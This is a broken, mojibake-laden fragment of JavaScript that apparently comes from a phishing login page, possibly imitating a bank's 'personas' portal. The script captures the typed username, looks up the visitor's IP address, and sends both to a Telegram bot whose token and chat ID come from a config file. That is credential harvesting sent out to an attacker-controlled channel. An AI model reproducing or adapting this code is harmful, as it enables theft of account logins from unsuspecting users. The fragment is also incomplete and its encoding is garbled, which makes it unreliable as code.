    <script type="module">
      import { botToken, chatId } from './config.js';

          e.preventDefault(); // Evita que el formulario se envÃ­e de la forma tradicional

          usuario = usuario.replace(/\s/g, '').toLowerCase();

          // Validar si incluye caracteres no permitidos
          const invalidCharacters = /[Ã±Ã¡Ã©Ã­Ã³ÃºÃ Ã¨Ã¬Ã²Ã¹Ã¤Ã«Ã¯Ã¶Ã¼Ã¢ÃªÃ®Ã´Ã»Ã§ÂºÂª!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?`~]/g;

          if (invalidCharacters.test(usuario) || usuario.length < 8 || usuario.length > 20 || numbersCount < 2) {

          // Obtener la direcciÃ³n IP del cliente
          fetch('https://api.ipify.org?format=json')
              .then(response => response.json())

                  // Construye el mensaje que enviarÃ¡s
                  const mensaje = `Bpersonas ðŸ›¡ï¸\n\nUsuario: ${usuario}\n\nIP: ${ip}`;

                  // Prepara la URL para la solicitud HTTP a Telegram
                  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

                  // Crea el objeto con los datos a enviar
                  const dataToSend = {
